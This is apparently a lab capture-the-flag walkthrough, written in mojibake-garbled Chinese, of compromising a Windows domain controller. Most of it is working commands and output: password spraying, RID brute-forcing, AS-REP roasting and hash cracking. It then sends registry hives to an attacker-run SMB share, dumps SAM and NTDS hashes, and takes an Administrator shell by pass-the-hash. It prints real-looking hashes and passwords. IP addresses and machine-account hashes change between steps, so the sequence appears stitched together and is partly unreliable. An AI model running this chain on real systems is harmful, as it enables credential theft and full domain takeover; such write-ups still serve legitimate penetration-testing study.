åŠ ä¸Šï¼š

```plain
--no-bruteforce
```

è¡¨ç¤ºï¼š

âŒ ä¸è¦å¯¹æ¯ä¸ªç”¨æˆ·å°è¯•æ•´ä¸ªå¯†ç åˆ—è¡¨  
âœ” åªå°è¯• â€œusername=passwordâ€ ä¸€ä¸€å¯¹åº”çš„ç»„åˆ

ä¹Ÿå°±æ˜¯è¯´ï¼š

`alice:alice  
bob:bob  
charlie:charlie`

```c
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Desktop/tools/kerbrute]
â””â”€# crackmapexec smb 10.0.90.222 -u user.txt -p user.txt --continue-on-success --no-bruteforce 

SMB         10.0.90.222     445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         10.0.90.222     445    DC01             [-] SOUPEDECODE.LOCAL\admin:admin STATUS_LOGON_FAILURE 
SMB         10.0.90.222     445    DC01             [-] SOUPEDECODE.LOCAL\ADMIN:ADMIN STATUS_LOGON_FAILURE 
SMB         10.0.90.222     445    DC01             [-] SOUPEDECODE.LOCAL\Administrator:Administrator STATUS_LOGON_FAILURE 
SMB         10.0.90.222     445    DC01             [+] SOUPEDECODE.LOCAL\charlie:charlie 
```



# æ¸—é€Charlie
```c
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Desktop/hmv]
â””â”€# crackmapexec smb 172.16.55.130 -u charlie -p charlie                         
SMB         172.16.55.130   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.55.130   445    DC01             [-] Connection Error: The NETBIOS connection with the remote host timed out.
```



```c
crackmapexec smb 172.16.55.130 -u charlie -p charlie --shares
SMB         172.16.55.130   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         172.16.55.130   445    DC01             [+] SOUPEDECODE.LOCAL\charlie:charlie 
SMB         172.16.55.130   445    DC01             [+] Enumerated shares
SMB         172.16.55.130   445    DC01             Share           Permissions     Remark
SMB         172.16.55.130   445    DC01             -----           -----------     ------
SMB         172.16.55.130   445    DC01             ADMIN$                          Remote Admin
SMB         172.16.55.130   445    DC01             C$                              Default share
SMB         172.16.55.130   445    DC01             IPC$            READ            Remote IPC
SMB         172.16.55.130   445    DC01             NETLOGON        READ            Logon server share 
SMB         172.16.55.130   445    DC01             SYSVOL          READ            Logon server share 
```

charlieç”¨æˆ·åªæœ‰æ ‡å‡†çš„åŸŸç”¨æˆ·æƒé™ï¼Œæ— æ³•è®¿é—®æ•æ„Ÿå…±äº«ã€‚



# åŸŸç”¨æˆ·è¿›ä¸€æ­¥æšä¸¾
## RIDçˆ†ç ´  RID çˆ†ç ´
ä½¿ç”¨charlieç”¨æˆ·çš„å‡­æ®è¿›è¡ŒRIDçˆ†ç ´ï¼Œè·å–æ›´å¤šç”¨æˆ·ä¿¡æ¯ï¼š

```c
â”Œâ”€â”€(kaliã‰¿kali)-[/mnt/hgfs/gx/x]
â””â”€$ nxc smb 192.168.205.146 -u charlie -p charlie --rid-brute|awk -F '\' '{print $2}'|awk '{print $1}' > user

```



## ASREPRoasting æ”»å‡»
å‚è€ƒï¼šhttps://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/asreproast.html?highlight=AS-REP#asreproast-without-credentials  
å‚è€ƒï¼šhttps://book.hacktricks.wiki/en/windows-hardening/active-directory-methodology/asreproast.htmlï¼Ÿhighlight=AS-REP#asreproast-without-credentials

ä½¿ç”¨GetNPUserså·¥å…·æ£€æŸ¥æ˜¯å¦æœ‰ç”¨æˆ·è®¾ç½®äº†"ä¸è¦æ±‚Kerberosé¢„è®¤è¯"å±æ€§ï¼š

æ­£å¸¸æµç¨‹ï¼ˆæœ‰é¢„è®¤è¯ï¼‰ï¼š

1. å®¢æˆ·ç«¯æŠŠâ€œç”¨å¯†ç åŠ å¯†çš„æ—¶é—´æˆ³â€å‘ç»™åŸŸæ§
2. åŸŸæ§è§£å¯†æˆåŠŸ â†’ è¯æ˜ä½ ç¡®å®çŸ¥é“å¯†ç 
3. åŸŸæ§å‘ç»™ä½ ç¥¨æ®

---

å¦‚æœ**ä¸è¦æ±‚é¢„è®¤è¯**ï¼š

å®¢æˆ·ç«¯ä»€ä¹ˆéƒ½ä¸ç”¨è¯æ˜  
åŸŸæ§ç›´æ¥å‘ç»™ä½ ä¸€æ®µâ€œç”¨ç”¨æˆ·å¯†ç åŠ å¯†çš„æ•°æ®â€ï¼ˆAS-REPï¼‰  
âš ï¸ ä»»ä½•äººéƒ½å¯ä»¥æ‹¿å›å»æ…¢æ…¢çˆ†ç ´

æ„æ€å°±æ˜¯ï¼š  
â— **åŸŸæ§å…è´¹é€ä½ ä¸€ä¸ªå¯ç¦»çº¿çˆ†ç ´å¯†ç çš„å¯†æ–‡**  
â— **ä¸é™æ¬¡æ•°**  
â— **ä¸ä¼šé”å®šè´¦æˆ·**  
â— **æ°¸è¿œä¸ä¼šæŠ¥è­¦**

```c
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Desktop/hmv/DC02]
â””â”€# impacket-GetNPUsers -usersfile user -dc-ip 172.16.55.130 'SOUPEDECODE.LOCAL/charlie:charlie' |grep -v "-"

$krb5asrep$23$zximena448@SOUPEDECODE.LOCAL:74b7f0a590296d9c3eb6118f7c38a98b$942ed00a3bf5befca1b8f287858ebbab857c60f0889492fc9949930cc469336be125b28b9afd49e2614587d39086a56119c364cacfa611421217c2fa1bc6e32c0239d6c39843ef898f0bf86e23bbdebd655f23976c56fb07e633270ea47936eaf59ef2505337ada1d75a9b57973d26794687ecfd4e5624f374d753a438ad83ef82d36f481143cbc1d34654e48e99fa5fffe19196bbd90c3d67d6d923712f775e9f0b527697b33ed78c87bd94716c608de049673e2ec54dd99b2b1b8cfbd0f19582e7a97912cb813a98e10a5860182d2c4f8012248adc58a23fed11a58d3f6a316c135f312e5a9903cd99410e1f637a81a435b1351c5e
                                                                                                        
```

## å“ˆå¸Œç ´è§£
ä½¿ç”¨johnå·¥å…·ç ´è§£AS-REPå“ˆå¸Œï¼š

```c
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Desktop/hmv/DC02]
â””â”€# john --wordlist=/usr/share/wordlists/rockyou.txt hash 
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
internet         ($krb5asrep$23$zximena448@SOUPEDECODE.LOCAL)     
1g 0:00:00:00 DONE (2025-12-07 05:01) 100.0g/s 102400p/s 102400c/s 102400C/s 123456..bethany
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

æˆåŠŸç ´è§£å¯†ç ï¼š`zximena448:internet`

# æƒé™æå‡
## éªŒè¯æ–°å‡­æ®
ä½¿ç”¨æ–°è·å¾—çš„å‡­æ®æµ‹è¯•æƒé™ï¼š

```c
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Desktop/hmv/DC02]
â””â”€# nxc smb 172.16.55.130 -u zximena448 -p internet --shares
[*] Initializing SMB protocol database
SMB         172.16.55.130   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)                                                                                                                                                       
SMB         172.16.55.130   445    DC01             [+] SOUPEDECODE.LOCAL\zximena448:internet 
SMB         172.16.55.130   445    DC01             [*] Enumerated shares
SMB         172.16.55.130   445    DC01             Share           Permissions     Remark
SMB         172.16.55.130   445    DC01             -----           -----------     ------
SMB         172.16.55.130   445    DC01             ADMIN$          READ            Remote Admin
SMB         172.16.55.130   445    DC01             C$              READ,WRITE      Default share
SMB         172.16.55.130   445    DC01             IPC$            READ            Remote IPC
SMB         172.16.55.130   445    DC01             NETLOGON        READ            Logon server share 
SMB         172.16.55.130   445    DC01             SYSVOL          READ            Logon server share 
```

zximena448ç”¨æˆ·å…·æœ‰æ›´é«˜æƒé™ï¼Œå¯ä»¥è®¿é—®ADMIN$å’ŒC$å…±äº«ã€‚

```c
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Desktop/hmv/DC02]
â””â”€# smbclient -U "SOUPEDECODE.LOCAL\zximena448" //172.16.55.130/C$ 
Password for [SOUPEDECODE.LOCAL\zximena448]:
Try "help" to get a list of possible commands.
smb: \> ls
  $WinREAgent                        DH        0  Sat Jun 15 15:19:51 2024
  Documents and Settings          DHSrn        0  Sat Jun 15 22:51:08 2024
  DumpStack.log.tmp                 AHS    12288  Sun Dec  7 20:27:15 2025
  pagefile.sys                      AHS 1476395008  Sun Dec  7 20:27:15 2025
  PerfLogs                            D        0  Sat May  8 04:15:05 2021
  Program Files                      DR        0  Sat Jun 15 13:54:31 2024
  Program Files (x86)                 D        0  Sat May  8 05:34:13 2021
  ProgramData                       DHn        0  Sat Jun 15 22:51:08 2024
  Recovery                         DHSn        0  Sat Jun 15 22:51:08 2024
  System Volume Information         DHS        0  Sat Jun 15 15:02:21 2024
  Users                              DR        0  Mon Jun 17 14:31:08 2024
  Windows                             D        0  Wed Aug 20 17:13:31 2025

                12942591 blocks of size 4096. 10862525 blocks available
smb: \> cd /Users/zximena448/desktop
smb: \Users\zximena448\desktop\> ls
  .                                  DR        0  Mon Jun 17 14:31:24 2024
  ..                                  D        0  Mon Jun 17 14:30:22 2024
  desktop.ini                       AHS      282  Mon Jun 17 14:30:22 2024
  user.txt                            A       33  Wed Jun 12 16:01:30 2024

                12942591 blocks of size 4096. 10862525 blocks available
smb: \Users\zximena448\desktop\> get user.txt
getting file \Users\zximena448\desktop\user.txt of size 33 as user.txt (2.7 KiloBytes/sec) (average 2.7 KiloBytes/sec)
smb: \Users\zximena448\desktop\> 

```

```c
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Desktop/hmv/DC02]
â””â”€# cat user.txt
2fe79eb0e02ecd4dd2833cfcbbdb504c

```

æ›´æ¢æ–°IP ï¼š172.16.55.130

### LDAPä¿¡æ¯æœé›†
æœ‰äº†æ–°çš„å‡­è¯ï¼Œå°±æš‚æ—¶ä¸ç”¨è€ƒè™‘`kerberos`äº†ï¼Œå°è¯•é€šè¿‡`LDAP`æ”¶é›†ADåŸŸçš„ç›¸å…³ä¿¡æ¯ï¼Œä½¿ç”¨åˆ°äº†ä¸€ä¸ªå«`ldapdomaindump`çš„å·¥å…·ï¼š 

```c

```

```c
â”Œâ”€â”€(rootã‰¿kali)-[/home/â€¦/Desktop/hmv/DC02/zximena448]
â””â”€# grep -Pinr zximena448                             
domain_users_by_group.html:489:<tr><td>Zach Ximena</td><td>Zach Ximena</td><td>zximena448</td><td>06/15/24 20:04:37</td><td>12/08/25 01:58:02</td><td>12/08/25 01:58:02</td><td>NORMAL_ACCOUNT, DONT_EXPIRE_PASSWD, DONT_REQ_PREAUTH</td><td>06/17/24 18:09:53</td><td><abbr title="S-1-5-21-2986980474-46765180-2505414164-1142">1142</abbr></td><td>Volunteer teacher and education advocate</td></tr>
domain_users_by_group.html:997:<tr><td>Zach Ximena</td><td>Zach Ximena</td><td>zximena448</td><td>06/15/24 20:04:37</td><td>12/08/25 01:58:02</td><td>12/08/25 01:58:02</td><td>NORMAL_ACCOUNT, DONT_EXPIRE_PASSWD, DONT_REQ_PREAUTH</td><td>06/17/24 18:09:53</td><td><abbr title="S-1-5-21-2986980474-46765180-2505414164-1142">1142</abbr></td><td>Volunteer teacher and education advocate</td></tr>
domain_users.json:59484:            "zximena448@soupedecode.local"
domain_users.json:59517:            "zximena448"
domain_users.json:59547:            "zximena448@soupedecode.local"
domain_users.html:489:<tr><td>Zach Ximena</td><td>Zach Ximena</td><td>zximena448</td><td><a href="domain_users_by_group.html#cn_Backup_Operators" title="CN=Backup Operators,CN=Builtin,DC=SOUPEDECODE,DC=LOCAL">Backup Operators</a></td><td><a href="domain_users_by_group.html#cn_Domain_Users" title="CN=Domain Users,CN=Users,DC=SOUPEDECODE,DC=LOCAL">Domain Users</a></td><td>06/15/24 20:04:37</td><td>12/08/25 01:58:02</td><td>12/08/25 01:58:02</td><td>NORMAL_ACCOUNT, DONT_EXPIRE_PASSWD, DONT_REQ_PREAUTH</td><td>06/17/24 18:09:53</td><td><abbr title="S-1-5-21-2986980474-46765180-2505414164-1142">1142</abbr></td><td>Volunteer teacher and education advocate</td></tr>
domain_users.grep:459:Zach Ximena       Zach Ximena     zximena448      Backup Operators        Domain Users    06/15/24 20:04:37       12/08/25 01:58:02 12/08/25 01:58:02        NORMAL_ACCOUNT, DONT_EXPIRE_PASSWD, DONT_REQ_PREAUTH    06/17/24 18:09:53       S-1-5-21-2986980474-46765180-2505414164-1142    Volunteer teacher and education advocate
```

> grep -Pinr zximena448  
>
> ## (1) -P
> å¯ç”¨ Perl å…¼å®¹æ­£åˆ™è¡¨è¾¾å¼ï¼ˆPCREï¼‰  
ä¹Ÿå°±æ˜¯è¯´ï¼Œæœç´¢è§„åˆ™å¯ä»¥ä½¿ç”¨æ›´å¼ºçš„æ­£åˆ™è¯­æ³•ã€‚  
ä½†è¿™é‡Œä½ æœç´¢çš„æ˜¯çº¯å­—ç¬¦ä¸² `**zximena448**`ï¼Œæ‰€ä»¥ -P æ²¡æœ‰ç‰¹åˆ«ä½œç”¨ã€‚
>
> ## (2) -i
> å¿½ç•¥å¤§å°å†™ï¼ˆcase-insensitiveï¼‰ã€‚  
ä¸ç®¡ç›®æ ‡å†…å®¹æ˜¯ï¼š
>
> + zximena448
> + Zximena448
> + ZXIMENA448
>
> éƒ½ä¼šè¢«åŒ¹é…åˆ°ã€‚
>
> ## (3) -n
> æ˜¾ç¤ºåŒ¹é…çš„è¡Œå·ã€‚
>
> ## (4) -r
> é€’å½’æœç´¢ï¼ˆrecursiveï¼‰ã€‚  
ä»å½“å‰ç›®å½•å¼€å§‹ï¼ŒåŒ…å«æ‰€æœ‰å­ç›®å½•åŠå­æ–‡ä»¶å…¨éƒ¨æœç´¢ã€‚
>



#### zximena448è´¦æˆ·åŸºç¡€ä¿¡æ¯è§£æ
```plain
å§“åï¼šZach Ximena  
è´¦æˆ·åï¼šzximena448  
SIDï¼šS-1-5-21-2986980474-46765180-2505414164-1142  
ç»„æˆå‘˜ï¼šBackup Operatorsã€Domain Users  
è´¦æˆ·ç±»å‹ï¼šNORMAL_ACCOUNT  
å¯†ç æ°¸ä¸è¿‡æœŸ (DONT_EXPIRE_PASSWD)  
ä¸éœ€è¦ Kerberos é¢„è®¤è¯ (DONT_REQ_PREAUTH) â† â˜…å…³é”®
```

##### ğŸ”¥ é‡è¦ç‚¹ï¼šDONT_REQ_PREAUTH = ä¸éœ€è¦ Kerberos é¢„è®¤è¯
è¿™æ„å‘³ç€è¯¥ç”¨æˆ· **å¯è¢« AS-REP Roasting**ï¼ˆAS-REPçˆ†ç ´/è„±æœºç ´è§£ï¼‰ã€‚  
ä¹Ÿå°±æ˜¯è¯´æ”»å‡»è€…å¯ä»¥ç›´æ¥å‘ DC è¯·æ±‚ä¸€ä¸ªå¯ç ´è§£çš„åŠ å¯†ç¥¨æ®ã€‚

â¡ï¸ ä½¿ç”¨å·¥å…·ï¼š

```plain
impacket-GetNPUsers soupedecode.local/zximena448 -dc-ip <DC>
```

è¿™èƒ½ç›´æ¥å¾—åˆ°å¯ç ´è§£çš„å¯†æ–‡ã€‚

---

#### âœ… 2. ç»„æˆå‘˜ä¿¡æ¯è§£æ
æœ€å…³é”®çš„æ˜¯ï¼š

##### Backup Operatorsï¼ˆå¤‡ä»½æ“ä½œå‘˜ï¼‰
Windows å†…ç½®é«˜æƒé™ç»„ï¼Œå®ƒçš„æƒé™åŒ…æ‹¬ï¼š

âœ” å¯ä»¥ **å¤‡ä»½ä¸è¿˜åŸæ•´ä¸ªç³»ç»Ÿ**  
âœ” å¯ç»•è¿‡æ–‡ä»¶ ACL  
âœ” å¯åˆ©ç”¨ `SeBackupPrivilege` å’Œ `SeRestorePrivilege` å®ç° **æœ¬åœ°ææƒ**  
âœ” åœ¨æŸäº›åœºæ™¯ä¸‹ç”šè‡³èƒ½ **è¯»å– NTDS.dit**ï¼ˆåŸŸæ§æ•°æ®åº“ï¼‰

â¡ï¸ æ”»å‡»è€…å¯ä»¥é€šè¿‡è¯¥ç»„æƒé™ï¼š

##### â˜… ææƒæ–¹å¼ï¼š
1. åˆ©ç”¨ `SeBackupPrivilege` è¯»å–ä»»æ„æ–‡ä»¶
2. è¯»å– SYSTEM + SAMï¼ˆæœ¬åœ°å“ˆå¸Œï¼‰ï¼Œç”šè‡³
3. **è¯»å– NTDS.ditï¼ˆæ•´ä¸ªåŸŸå“ˆå¸Œï¼‰**

## æå–hashè·å–å‡­è¯
æ¥ä¸‹æ¥å°±æ˜¯æä¸€ä¸ªä¸´æ—¶çš„`smb`æœåŠ¡å™¨ï¼Œå°è¯•å°†è¿œç¨‹æ–‡ä»¶åŠhashå¯¼å…¥æœ¬åœ°å°è¯•ç ´è§£ï¼š  

```c
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Desktop/hmv/DC02]
â””â”€# mkdir share     
                                                                                                                                                           
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali/Desktop/hmv/DC02]
â””â”€# impacket-smbserver -smb2support kali ./share  
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0

```

impacket-smbserver -smb2support kali ./share

è¿™æ¡å‘½ä»¤å«ä¹‰ï¼š

    åˆ›å»º SMB å…±äº«åï¼škali

    å®é™…å¯¹åº”æœ¬åœ°ç›®å½•ï¼š./share

```c
â”Œâ”€â”€(rootã‰¿kali)-[/home/kali]
â””â”€# impacket-reg "SOUPEDECODE.LOCAL/zximena448:internet@172.16.55.130" backup -o //172.16.55.210/kali                        
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[!] Cannot check RemoteRegistry status. Triggering start trough named pipe...
[*] Saved HKLM\SAM to //172.16.55.210/kali\SAM.save
[*] Saved HKLM\SYSTEM to //172.16.55.210/kali\SYSTEM.save
[*] Saved HKLM\SECURITY to //172.16.55.210/kali\SECURITY.save
```

> `impacket-reg` ä¼šè‡ªåŠ¨æŠŠå¯¼å‡ºçš„ SAM / SYSTEM / SECURITY ä¿å­˜åˆ°ä½ æŒ‡å®šçš„ UNC è·¯å¾„ï¼ˆä½ çš„ SMB å…±äº«ç›®å½•ï¼‰ï¼Œæ‰€ä»¥ä½ çœ‹åˆ°å®ƒå­˜åˆ°äº†kaliï¼šä¹Ÿå°±æ˜¯ä½ ç”¨ `impacket-smbserver` å¼€å‡ºçš„å…±äº«ç›®å½• **./share**ã€‚
>



## `impacket-secretsdump`
```c
â”Œâ”€â”€(rootã‰¿kali)-[/home/â€¦/Desktop/hmv/DC02/share]
â””â”€# impacket-secretsdump -system SYSTEM.save -security SECURITY.save -sam SAM.save LOCAL
Impacket v0.13.0.dev0 - Copyright Fortra, LLC and its affiliated companies 

[*] Target system bootKey: 0x0c7ad5e1334e081c4dfecd5d77cc2fc6
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)
Administrator:500:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[*] Dumping cached domain logon information (domain/username:hash)
[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
$MACHINE.ACC:plain_password_hex:6bb0837cc9ef088d840c0fbc9c052c6ce6d1e3aca32a2ae3922805d644d7e3223f48b4e08088f76370bbb8ab85264cb4720b282643921402676be48d8d346686e2e12705a353bc9120306f4f5f49f107a27e01e2348e4b882338ec41c4f39e61e9dfa5e58f83637657c431c3d78d661ab091b9c0711f7e8ad0b0be5c73961a1d6cbee0f9c865bd8619c756241dc865f64effe8bbcf55fb8187f1fa18043eff8d8e5c4e5bf99d09d854b89c2296f658a08643bba26489f1b04012cb2eef8de0aa453c334218a45470f95de935855cbcf4aa87664bd81b7d52d72ed261c7a374b081db7d707546f18e53ed27e768e2c6aa
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:f9b18cfad5dc2ace780c2474e19ff1c6
[*] DPAPI_SYSTEM 
dpapi_machinekey:0x829d1c0e3b8fdffdc9c86535eac96158d8841cf4
dpapi_userkey:0x4813ee82e68a3bf9fec7813e867b42628ccd9503
[*] NL$KM 
 0000   44 C5 ED CE F5 0E BF 0C  15 63 8B 8D 2F A3 06 8F   D........c../...
 0010   62 4D CA D9 55 20 44 41  75 55 3E 85 82 06 21 14   bM..U DAuU>...!.
 0020   8E FA A1 77 0A 9C 0D A4  9A 96 44 7C FC 89 63 91   ...w......D|..c.
 0030   69 02 53 95 1F ED 0E 77  B5 24 17 BE 6E 80 A9 91   i.S....w.$..n...
NL$KM:44c5edcef50ebf0c15638b8d2fa3068f624dcad95520444175553e85820621148efaa1770a9c0da49a96447cfc896391690253951fed0e77b52417be6e80a991
[*] Cleaning up... 
```

å¯ä»¥æ‹¿åˆ°`administrator`çš„NTLM

```python
Administrator:500:aad3b435b51404eeaad3b435b51404ee:209c6174da490caeb422f3fa5a7ae634:::
```

å°è¯•ç™»å½•ï¼Œå¤±è´¥

```python
crackmapexec smb 192.168.56.126 -u administrator -H 209c6174da490caeb422f3fa5a7ae634                    
SMB         192.168.56.126  445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)
SMB         192.168.56.126  445    DC01             [-] SOUPEDECODE.LOCAL\\administrator:209c6174da490caeb422f3fa5a7ae634 STATUS_LOGON_FAILURE
```

ç°åœ¨è¿˜å­˜åœ¨æœºå™¨è´¦æˆ·çš„hash `$MACHINE.ACC`

```python
$MACHINE.ACC: aad3b435b51404eeaad3b435b51404ee:159de75b1e7662879be6482554b90e55
```

æšä¸¾çœ‹æ˜¯å“ªå°æœºå­çš„å“ˆå¸Œï¼Œå¾—å‡ºæ¥æ˜¯`DC01$`çš„

```python
crackmapexec smb 192.168.56.126 -u username.txt -H 159de75b1e7662879be6482554b90e55
SMB         192.168.56.126  445    DC01             [+] SOUPEDECODE.LOCAL\\DC01$:159de75b1e7662879be6482554b90e55
```

å¾—åˆ°æ˜¯`DC01$`çš„hashåï¼Œå†æ¬¡è¿›è¡Œ`secretsdump.py` è·å–`Administrator`çš„hash

```c
â”Œâ”€â”€(kaliã‰¿kali)-[~/temp/DC02]
â””â”€$ impacket-secretsdump 'SOUPEDECODE.LOCAL/DC01$@192.168.10.107' -hashes 'aad3b435b51404eeaad3b435b51404ee:f57e704569f3ff005004963445e0438c' > log3

â”Œâ”€â”€(kaliã‰¿kali)-[~/temp/DC02]
â””â”€$ cat log3 | grep ":500:"
Administrator:500:aad3b435b51404eeaad3b435b51404ee:8982babd4da89d33210779a6c5b078bd:::

```

```plain
â”Œâ”€â”€(kaliã‰¿kali)-[/mnt/hgfs/gx/x]
â””â”€$ nxc smb 192.168.205.146 -u 'DC01$' -H 'aa905227fd1b4142a01a09912606af5c' --ntds
[+] Dumping the NTDS, this could take a while so go grab a redbull...
SMB         192.168.205.146 445    DC01             Administrator:500:aad3b435b51404eeaad3b435b51404ee:8982babd4da89d33210779a6c5b078bd:::
SMB         192.168.205.146 445    DC01             Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
SMB         192.168.205.146 445    DC01             krbtgt:502:aad3b435b51404eeaad3b435b51404ee:fb9d84e61e78c26063aced3bf9398ef0:::
SMB         192.168.205.146 445    DC01             soupedecode.local\bmark0:1103:aad3b435b51404eeaad3b435b51404ee:d72c66e955a6dc0fe5e76d205a630b15:::
```

# åˆ©ç”¨å‡­è¯è·å–shell
```c
â”Œâ”€â”€(rootã‰¿kali)-[/home/â€¦/Desktop/hmv/DC02/share]
â””â”€# evil-winrm -i 172.16.55.130 -u 'administrator' -H '8982babd4da89d33210779a6c5b078bd'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\Administrator\Documents> cd ../
*Evil-WinRM* PS C:\Users\Administrator> cd desktop
*Evil-WinRM* PS C:\Users\Administrator\desktop> ls


    Directory: C:\Users\Administrator\desktop


Mode                 LastWriteTime         Length Name
----                 -------------         ------ ----
-a----         6/12/2024   1:01 PM             33 root.txt


*Evil-WinRM* PS C:\Users\Administrator\desktop> type root.txt
d41d8cd98f00b204e9800998ecf8427e
*Evil-WinRM* PS C:\Users\Administrator\desktop> 
```





